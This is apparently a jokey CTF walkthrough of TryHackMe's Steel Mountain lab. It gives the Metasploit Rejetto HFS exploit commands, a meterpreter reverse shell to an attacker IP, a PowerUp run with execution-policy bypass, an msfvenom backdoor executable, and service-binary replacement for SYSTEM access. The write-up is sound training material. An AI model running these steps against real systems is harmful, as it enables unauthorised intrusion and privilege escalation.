# TryHackMe – Steel Mountain 🏔️
## “Because what’s life without a little corporate sabotage?”

  ## Target IP: 10.10.202.175

  ## Attacker IP (me): 10.13.83.247

  ## Shell Port: 4444 (because tradition matters)

  

## 🔍 Step 1: Nmap – Reconnaissance or Just Fancy Port Stalking

### Let’s be honest, if you’re not starting with Nmap, are you even trying?

## nmap -sC -sV -oN steel-nmap 10.10.202.175

### Results?
Port 80 open. Web server is running Rejetto HFS 2.3, aka “Hello, I’m vulnerable and proud.”


## 💣 Step 2: Metasploit – Because Why Work Hard

### After seeing Rejetto, my brain went, “Cool, I’ve got a module for that,” and fired up Metasploit. Manual exploitation is for people with patience and time. I had neither.

use exploit/windows/http/rejetto_hfs_exec
set RHOST 10.10.202.175
set LHOST 10.13.83.247
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
run

### No surprises. A shiny new meterpreter session popped up like it owed me money.



## 🧼 Step 3: Privilege Enumeration – Let the Scripts Think for You

### Uploaded PowerUp.ps1 because I prefer my enumeration like I prefer my coffee: automated and mildly dangerous.

upload PowerUp.ps1 C:\\Windows\\Temp\\PowerUp.ps1
powershell -exec bypass -f C:\\Windows\\Temp\\PowerUp.ps1

### PowerUp politely informed me that there’s a service called AdvancedSystemCareService9 that’s just begging to be abused. Windows never disappoints.



## 🔨 Step 4: Privilege Escalation – Replace, Restart, Rejoice

Time to abuse that janky service.


### Step 4.1 – Build a Backdoor

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.83.247 LPORT=4444 -f exe -o /tmp/malicious.exe

Because nothing says “admin access” like uploading something called malicious.exe.


### Step 4.2 – Upload & Replace

upload /tmp/malicious.exe C:\\Windows\\Temp\\malicious.exe

### Then I replaced the service binary (manually or through meterpreter) with my backdoor and restarted the service:

sc stop AdvancedSystemCareService9
sc start AdvancedSystemCareService9

### Boom. SYSTEM access. Because Microsoft can’t be bothered.



## 🏁 Step 5: Root.txt – The Holy Grail of Every CTF

cd C:\\Users\\Administrator\\Desktop
cat root.txt

## Flag captured. Game over. Insert dramatic mic drop here.


🧠 TL;DR (for the lazy but curious)
Phase	Tool Used	What Happened

Recon	Nmap	Found Rejetto HFS 2.3 on port 80

Initial Access	Metasploit	RCE exploit got us meterpreter

Enumeration	PowerUp	Identified vulnerable service

Privesc	Malicious .exe & service restart	Got SYSTEM shell

Loot	Shell + root.txt	The flag is mine, peasant


## 🧃 Final Thoughts

Steel Mountain was fun. Classic CTF structure: weak web app + service hijacking = win.
Would recommend if you enjoy watching Windows security fall apart like IKEA furniture built without instructions.

## PROOF OF COMPLETION 

![Image](https://github.com/user-attachments/assets/ae590eae-b681-4d0b-bef8-a395ec67dbab)
